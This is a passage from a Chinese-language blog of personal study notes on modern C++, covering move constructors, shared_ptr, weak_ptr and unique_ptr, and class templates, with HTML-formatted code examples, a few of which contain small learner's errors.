class="line">&#125;;</span><br><span class="line"><span class="function">Test <span class="title">makeTest</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	Test t;</span><br><span class="line">	<span class="keyword">return</span> t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	Test t = <span class="built_in">makeTest</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p> 注意这里的右值引用不能是const的，因为你用右值引用函数参数就算为了让其绑定到一个右值上去的！就是说这个右值引用是一定要变的，但是你一旦加了const就没法改变该右值引用了。</p>
<p><strong>3.</strong> <strong>默认移动构造函数和默认移动赋值运算符</strong></p>
<p> 会默认生成移动构造函数和移动赋值运算符的条件：</p>
<p> <strong>只有一个类没有定义任何自己版本的拷贝操作（拷贝构造，拷贝赋值运算符），且类的每个非静态成员都可以移动，系统才能为我们合成。</strong></p>
<p> <strong>可以移动的意思就是可以就行移动构造，移动赋值。所有的基础类型都是可以移动的，有移动语义的类也是可以移动的。</strong></p>
<p>hhh,周五成功把part3结束，但是移动构造函数还是不太懂，要复习喽</p>
<h1 id="智能指针"><a href="#智能指针" class="headerlink" title="智能指针"></a>智能指针</h1><h2 id="智能指针概述"><a href="#智能指针概述" class="headerlink" title="智能指针概述"></a>智能指针概述</h2><p> <strong>1.</strong> 为什么要有智能指针：在Part2的第二节课已经讲过，直接使用new和delete运算符极其容易导致内存泄露，而且非常难以避免。于是人们发明了智能指针这种可以自动回收内存的工具。</p>
<p>  <strong>2.</strong> 智能指针一共就三种：普通的指针可以单独一个指针占用一块内存，也可以多个指针共享一块内存。</p>
<p>(1) 共享型智能指针：shared_ptr，同一块堆内存可以被多个shared_ptr共享。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* pi = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="function"><span class="type">int</span>* <span class="title">pi2</span><span class="params">(pi)</span></span>;<span class="comment">//pi2和pi共享一段内存</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(2) 独享型智能指针：unique_ptr，同一块堆内存只能被一个unique_ptr拥有。无法拷贝和制造</p>
<p>(3) 弱引用智能指针：weak_ptr，也是一种共享型智能指针，可以视为对共享型智能指针的一种补充</p>
<p> <strong>3.</strong> <strong>（*）智能指针注意事项：</strong></p>
<p><strong>智能指针和裸指针不要混用，接下来的几节课会反复强调这一点。</strong></p>
<h2 id="shared-ptr"><a href="#shared-ptr" class="headerlink" title="(*)shared_ptr"></a>(*)shared_ptr</h2><p><strong>1.shared_ptr的工作原理</strong> </p>
<p> (1)我们在动态分配内存时，堆上的内存必须通过栈上的内存来寻址。也就是说栈上的指针（堆上的指针也可以指向堆内存，但终究是要通过栈来寻址的）是寻找堆内存的唯一方式。<br> (2)所以我们可以给堆内存添加一个引用计数，有几个指针指向它，它的引用计数就是几，当引用计数为0时，操作系统会自动释放这块堆内存。<br> <strong>2.Shared_ptr的常用操作</strong> </p>
<p><strong>(1)shared_ptr的初始化</strong> </p>
<p> ①使用new运算符初始化， 一般来说不推荐使用new进行初始化，因为C++标准提供了专门创建shared_ptr的函数“make_shared”，该函数是经过优化的，效率更高。<br> ②使用make_shared函数进行初始化：  </p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">sharedI2</span>(sharedI);<span class="comment">//允许多个智能指针指向同一块内存</span></span><br></pre></td></tr></table></figure>

<p>注意：千万不要用裸指针初始化shared_ptr，容易出现内存泄露的问题。</p>
<p> ③当然使用复制构造函数初始化也是没有问题的。<br> 代码演示:   </p>
<p>(2)shared_ptr的引用计数：  智能指针就是通过引用计数来判断释放堆内存时机的。<br>use_count()函数可以得到shared_ptr对象的引用计数。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">shareI2</span>(sharedI); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl; 	</span><br><span class="line">	shareI2.<span class="built_in">reset</span>(); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;<span class="comment">//结果输出121</span></span><br></pre></td></tr></table></figure>

<p><strong>3.智能指针可以像普通指针那样使用，”share_ptr”早已对各种操作进行了重载，就当它是普通指针就可以了.</strong> </p>
<p>**4.Shared_ptr的常用函数 **</p>
<p>(3)unique函数：判断该shared_ptr对象是否独占若独占，返回true。否则返回false。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;<span class="comment">//独占返回1 	</span></span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">shareI2</span>(sharedI); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;<span class="comment">//独占返回0 	</span></span><br><span class="line">	shareI2.<span class="built_in">reset</span>(); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;<span class="comment">//返回1</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p> (4)reset函数： </p>
<p>①当reset函数有参数时，改变此shared_ptr对象指向的内存。<br>②当reset函数无参数时，将此shared_ptr对象置空，也就是将对象内存的指针设置为nullptr。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">unique</span>() &lt;&lt; std::endl;	</span><br><span class="line">	sharedI.<span class="built_in">reset</span>(<span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">1000</span>));<span class="comment">//原有堆内存被释放，指向新的堆内存,写法不能写成shared_ptr的初始化</span></span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI2 = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">	sharedI = sharedI2;</span><br><span class="line">	sharedI.<span class="built_in">reset</span>();<span class="comment">//置为空</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(5)get函数，强烈不推荐使用</p>
<p>(6)swap函数：交换两个智能指针所指向的内存</p>
<p>①std命名空间中全局的swap函数 </p>
<p>②shared_ptr类提供的swap函数</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>); 	</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI2 = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">1000</span>);</span><br><span class="line">	sharedI.<span class="built_in">swap</span>(sharedI2);<span class="comment">//std::swap(sharedI,sharedI2)</span></span><br><span class="line">	std::cout &lt;&lt; *sharedI &lt;&lt; std::endl;</span><br><span class="line">	std::cout &lt;&lt; *sharedI2 &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/2023/03/05/%E7%8E%B0%E4%BB%A3C++%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-03-20%20165343-1679302470989-3.png"></p>
<p> 5.关于智能指针创建数组的问题。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function">std::shared_ptr&lt;<span class="type">int</span>&gt; <span class="title">sharedI</span><span class="params">(<span class="keyword">new</span> <span class="type">int</span>[<span class="number">100</span>]())</span></span>;</span><br><span class="line">std::cout&lt;&lt;sharedI.<span class="built_in">get</span>()[<span class="number">10</span>]&lt;&lt;std::endl;<span class="comment">//不能像普通数组一样使用</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myFunc</span><span class="params">(std::shared_ptr&lt;<span class="type">int</span>&gt; sharedI)</span><span class="comment">//不用写const</span></span></span><br></pre></td></tr></table></figure>

<p>6.用智能指针作为参数传递时直接值传递就可以了。shared_ptr的大小为固定的8或16字节（也就是两倍指针的的大小，32位系统指针为4个字节，64位系统指针为8个字节，shared_ptr中就两个指针），所以直接值传递就可以了。</p>
<p> shared_ptr总结：在现代程序中，当想要共享一块堆内存时，优先使用shared_ptr，可以极大的减少内存泄露的问题。</p>
<h2 id="weak-ptr"><a href="#weak-ptr" class="headerlink" title="(*)weak_ptr"></a>(*)weak_ptr</h2><p><strong>1.</strong> <strong>weak_ptr介绍：</strong></p>
<p>(1) 这个智能指针是在C++11的时候引入的标准库，它的出现完全是为了弥补shared_ptr天生有缺陷的问题，其实shared_ptr可以说近乎完美。</p>
<p>(2) 只是通过引用计数实现的方式也引来了引用成环的问题，这种问题靠它自己是没办法解决的，所以在C++11的时候将shared_ptr和weak_ptr一起引入了标准库，用来解决循环引用的问题。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;<span class="type">int</span>&gt;sharedI = std::<span class="built_in">make_shared</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">	std::weak_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">weakI</span>(sharedI);<span class="comment">//weak_ptr指向同一个内存不增加引用计数</span></span><br><span class="line">	std::cout &lt;&lt; sharedI.<span class="built_in">use_count</span>() &lt;&lt; std::endl;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>2.</strong> <strong>shared_ptr的循环引用问题：</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">A</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	std::weak_ptr&lt;B&gt; weakB;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">B</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	std::shared_ptr&lt;A&gt; sharedA;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span></span><br><span class="line"><span class="function"></span>&#123; 	</span><br><span class="line">	std::shared_ptr&lt;A&gt;sharedA = std::<span class="built_in">make_shared</span>&lt;A&gt;();</span><br><span class="line">	std::shared_ptr&lt;B&gt;shareB = std::<span class="built_in">make_shared</span>&lt;B&gt;();</span><br><span class="line">	sharedA-&gt;weakB = weakB;</span><br><span class="line">	weakB-&gt;sharedA = sharedA;<span class="comment">//如果为两个shared_ptr相互指引导致内存无法释放,所以将其中一个改为weak_ptr</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.</strong> <strong>weak_ptr的作用原理：</strong>weak_ptr的对象需要绑定到shared_ptr对象上，作用原理是weak_ptr不会改变shared_ptr对象的引用计数。只要shared_ptr对象的引用计数为0，就会释放内存，weak_ptr的对象不会影响释放内存的过程。</p>
<p>总结：<strong>weak_ptr使用较少，就是为了处理shared_ptr循环引用问题而设计的。</strong></p>
<h2 id="unique-ptr"><a href="#unique-ptr" class="headerlink" title="(*)unique_ptr"></a>(*)unique_ptr</h2><p><strong>1.</strong> <strong>uniqe_ptr介绍：</strong>独占式智能指针，在使用智能指针时，我们一般优先考虑独占式智能指针，因为消耗更小。如果发现内存需要共享，那么再去使用“shared_ptr”。</p>
<p><strong>2</strong> <strong>unique_ptr的初始化</strong>：和shared_ptr完全类似</p>
<p>(1) 使用new运算符进行初始化</p>
<p>(2) 使用make_unique函数进行初始化</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">uniqueI2</span>(<span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">100</span>));</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>3.</strong> <strong>unique_ptr的常用操作</strong></p>
<p>(1) unque_ptr禁止复制构造函数，也禁止赋值运算符的重载。否则独占便毫无意义。</p>
<p>(2) unqiue_ptr允许移动构造，移动赋值。移动语义代表之前的对象已经失去了意义，移动操作自然不影响独占的特性。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt;uniqueI2=std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">    uniqueI2=std::<span class="built_in">move</span>(uniqueI);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>(3) reset函数：</p>
<p>① 不带参数的情况下：释放智能指针的对象，并将智能指针置空。</p>
<p>② 带参数的情况下：释放智能指针的对象，并将智能指针指向新的对象。</p>
<p> <strong>和shared_ptr使用方法一样</strong></p>
<p><strong>4.</strong> <strong>将unque_ptr的对象转化为shared_ptr对象，</strong>当unique_ptr的对象为一个右值时，就可以将该对象转化为shared_ptr的对象。</p>
<p><strong>这个使用的并不多，需要将独占式指针转化为共享式指针常常是因为先前设计失误。</strong></p>
<p><strong>注意：shared_ptr对象无法转化为unique_ptr对象。</strong></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;vld.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;memory&gt;</span> </span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">myfunc</span><span class="params">(std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI)</span><span class="comment">//需要共享操作时</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    std::shared_ptr&lt;<span class="type">int</span>&gt;<span class="built_in">sharedI</span>(std::<span class="built_in">move</span>(uniqueI));<span class="comment">//转换</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	std::unique_ptr&lt;<span class="type">int</span>&gt; uniqueI = std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">100</span>);</span><br><span class="line">    std::unique_ptr&lt;<span class="type">int</span>&gt;uniqueI2=std::<span class="built_in">make_unique</span>&lt;<span class="type">int</span>&gt;(<span class="number">200</span>);</span><br><span class="line">    uniqueI2=std::<span class="built_in">move</span>(uniqueI);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="只能指针适用范围"><a href="#只能指针适用范围" class="headerlink" title="(**)只能指针适用范围"></a>(**)只能指针适用范围</h2><p><strong>1.</strong> <strong>能使用智能指针就尽量使用智能指针，那么哪些情况属于不能使用智能指针的情况  呢？</strong></p>
<p> 有些函数必须使用C语言的指针，这些函数又没有替代，这种情况下，才使用普通的指针，其它情况一律使用智能指针。</p>
<p> 必须使用C语言指针的情况包括：</p>
<p><strong>（1）</strong> <strong>网络传输函数</strong>，比如windows下的send，recv函数，只能使用c语言指针，无法替代.</p>
<p><strong>（2）</strong> <strong>c语言的文件操作部分</strong>。这方面C++已经有了替代品，C++的文件操作完全支持智能指针，<strong>所以在做大型项目时，推荐使用C++的文件操作功能。</strong></p>
<p><strong>除了以上两种情况，剩下的均推荐使用智能指针。</strong></p>
<p><strong>2.</strong> <strong>我们应该使用哪个智能指针呢？</strong></p>
<p><strong>(1)</strong> <strong>优先使用unique_ptr，内存需要共享时再使用shared_ptr。</strong></p>
<p><strong>当使用shared_ptr时，如果出现了循环引用的情况，再去考虑使用weak_ptr</strong></p>
<h1 id="模板与泛型编程"><a href="#模板与泛型编程" class="headerlink" title="模板与泛型编程"></a>模板与泛型编程</h1><h2 id="模板介绍，类模板与模板实现原理"><a href="#模板介绍，类模板与模板实现原理" class="headerlink" title="模板介绍，类模板与模板实现原理"></a>模板介绍，类模板与模板实现原理</h2><p><strong>1.</strong> <strong>模板的重要性：模板是C++最重要的模块之一，很多人对模板的重视不够，这一章一定要好好学，所有课时都是重点。</strong></p>
<p><strong>C++的三大模块，面向过程，面向对象，模板与泛型。面向过程就是C语言，面向对象就是类，现在轮到模板与泛型了。</strong></p>
<p><strong>2.</strong> <strong>模板的介绍：</strong></p>
<p>(1) 模板能够实现一些其他语法难以实现的功能，但是理解起来会更加困难，容易导致新手摸不着头脑。</p>
<p>(2) 模板分为类模板和函数模板，函数模板又分为普通函数模板和成员函数模板。</p>
<p> <strong>3.</strong> <strong>类模板基础：</strong></p>
<p>类模板的写法与使用十分固定</p>
 <figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> iterator = T*;<span class="comment">//定义新的类型</span></span><br><span class="line">	<span class="keyword">using</span> const_iterator = <span class="type">const</span> T*;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">size_t</span> count);</span><br><span class="line">	~<span class="built_in">MyArray</span>();</span><br><span class="line">	<span class="comment">//&#123; 写在类里面</span></span><br><span class="line">	<span class="comment">//	if (count)</span></span><br><span class="line">	<span class="comment">//	&#123;</span></span><br><span class="line">	<span class="comment">//		data = new T[count]();</span></span><br><span class="line">	<span class="comment">//	&#125;</span></span><br><span class="line">	<span class="comment">//	else</span></span><br><span class="line">	<span class="comment">//	&#123;</span></span><br><span class="line">	<span class="comment">//		data = nullptr;</span></span><br><span class="line">	<span class="comment">//	&#125;</span></span><br><span class="line">	<span class="comment">//&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//&#123;//类内定义</span></span><br><span class="line"><span class="comment">//	if (data)</span></span><br><span class="line"><span class="comment">//	&#123;</span></span><br><span class="line"><span class="comment">//		delete[] data;</span></span><br><span class="line"><span class="comment">//	&#125;</span></span><br><span class="line"><span class="comment">//&#125;</span></span><br><span class="line">	<span class="function">iterator <span class="title">begin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="function">const_iterator <span class="title">cbegin</span><span class="params">()</span><span class="type">const</span></span></span><br><span class="line"><span class="function">	</span>&#123;</span><br><span class="line">		<span class="keyword">return</span> data;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">	T* data;<span class="comment">//在类中复杂情况可以用智能指针，在老版本不支持创建数组</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//写在类外面，一般都在类外定义</span></span><br><span class="line">MyArray&lt;T&gt;::<span class="built_in">MyArray</span>(<span class="type">size_t</span> count)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (count)</span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="keyword">new</span> T[count]();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		data = <span class="literal">nullptr</span>;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">////类外定义需要先把模板头写上去</span></span><br><span class="line">MyArray&lt;T&gt;::~<span class="built_in">MyArray</span>()</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">if</span> (data)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">delete</span>[] data;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//begin的类外定义</span></span><br><span class="line"><span class="keyword">typename</span> MyArray&lt;T&gt;::iterator MyArray&lt;T&gt;::<span class="built_in">begin</span>() <span class="type">const</span><span class="comment">//::前面的名称一定是类名或者明明空间</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">return</span> data;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>注意，这段代码非常有代表性，在下一课补完后，一定要掌握，多看几遍。</strong></p>
<p><strong>4.</strong> <strong>模板的实现原理：</strong></p>
<p>模板需要编译两次，在第一次编译时仅仅检查最基本的语法，比如括号是否匹配。等函数真正被调用时，才会真正生成需要的类或函数。所以这直接导致了一个结果，就是不论是模板类还是模板函数，声明与实现都必须放在同一个文件中。因为在程序在编译期就必须知道函数的具体实现过程。如果实现和声明分文件编写，需要在链接时才可以看到函数的具体实现过程，这当然会报错。</p>
<p> 于是人们发明了.hpp文件来存放模板这种声明与实现在同一文件的情况。</p>
<h2 id="initializer-list与typename"><a href="#initializer-list与typename" class="headerlink" title="(*)initializer_list与typename"></a>(*)initializer_list与typename</h2><p>1.initializer_list的用法</p>
<p>(1) initializer_list介绍：initializer_list其实就是初始化列表，我们可以用初始化列表初始化各种容器，比如“vector”，“数组”。</p>
<p> 2.typename的用法</p>
<p>(1) 在定义模板时表示这个一个待定的类型</p>
<p>(2) 在类外表明自定义类型时使用</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">#.hpp</span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;type_traits&gt;</span><span class="comment">//萃取技术判断是否是指针</span></span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;<span class="comment">//模板特化</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">get_type</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> type = T;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">get_type</span>&lt;T*&gt;</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> type = T;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> iterator = T*;<span class="comment">//定义新的类型</span></span><br><span class="line">	<span class="keyword">using</span> const_iterator = <span class="type">const</span> T*;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">size_t</span> count);</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">const</span> std::initializer_list&lt;T&gt;&amp; list);</span><br><span class="line">	<span class="meta">#<span class="keyword">pragma</span> once</span></span><br><span class="line"><span class="keyword">template</span>&lt;<span class="keyword">typename</span> T&gt;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MyArray</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">using</span> iterator = T*;<span class="comment">//定义新的类型</span></span><br><span class="line">	<span class="keyword">using</span> const_iterator = <span class="type">const</span> T*;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">const</span> std::initializer_list&lt;T&gt;&amp; list);</span><br><span class="line">	<span class="built_in">MyArray</span>(std::initializer_list&lt;T&gt;&amp;&amp; list);</span><br><span class="line">	<span class="built_in">MyArray</span>(<span class="type">size_t</span> count);</span><br><span class="line">	~<span class="built_in">MyArray</span>();</span><br><span class="line"></span><br><span class="line">	<span class="function">iterator <span class="title">begin</span><span class="params">()</span><span 